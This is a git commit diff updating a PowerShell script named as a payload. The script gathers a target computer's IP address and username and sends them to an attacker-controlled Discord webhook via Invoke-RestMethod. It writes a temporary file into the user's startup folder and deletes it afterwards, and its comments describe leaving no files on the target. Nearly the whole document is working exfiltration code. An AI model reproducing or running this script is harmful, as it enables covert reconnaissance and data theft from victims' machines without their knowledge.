94faf206879c1c4139f8eefc9ff71a9e5d00ae84
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-10-29 01:53:31 +0800

    Updated

--- Payload/DiscordPowershellDiscovery.ps1
+++ Payload/DiscordPowershellDiscovery.ps1
@@ -1,20 +1,19 @@
+# None of the files created will be saved on the target's computer
+# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
+
 # Get IPv4 address for WiFi adapter
 $WiFiAdapterName = "Wi-Fi"
 $WiFiIPv4 = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq $WiFiAdapterName -and $_.AddressFamily -eq "IPv4" }).IPAddress
 
-# Get IPv4 address for Ethernet adapter
-$EthernetAdapterName = "Ethernet"
-$EthernetIPv4 = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq $EthernetAdapterName -and $_.AddressFamily -eq "IPv4" }).IPAddress
+# Check if Ethernet0 adapter exists
+if ($EthernetIPv4 = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq "Ethernet0" -and $_.AddressFamily -eq "IPv4" }).IPAddress) {
+    # Ethernet0 adapter found
+    $IPAddress = $EthernetIPv4
+} else {
+    # Ethernet0 adapter not found
+    $IPAddress = $WiFiIPv4
+}
 
-# Display the IPv4 addresses
-Write-Host "WiFi IPv4 Address: $WiFiIPv4"
-Write-Host "Ethernet IPv4 Address: $EthernetIPv4"
-
-# None of the files created will be saved on the target's computer
-# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
-
-# Get the Wi-Fi IPv4 Address
-$IPAddress = (Get-NetIPAddress -InterfaceAlias "Wi-Fi" | Where-Object {$_.AddressFamily -eq "IPv4"}).IPAddress
 # Get the current user's username
 $Username = $env:USERNAME
 
@@ -28,8 +27,8 @@ $DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$Startup
 $DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile
 
 # Create a text file in the user's startup folder
-$TextContent = "Wi-Fi IPv4 Address: $WiFiIPv4`nEthernet IPv4 Address: $EthernetIPv4`nUsername: $Username"
-$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
+$TextContent = "$IPAddress`n$Username"
+$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory$Username.icu"
 $TextContent | Out-File -FilePath $TextFile
 
 # Define a message (commented out for now)
@@ -54,4 +53,4 @@ $Headers = @{
 Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload
 
 # Delete the text file
-Remove-Item -Path $TextFil
+Remove-Item -Path $TextFile
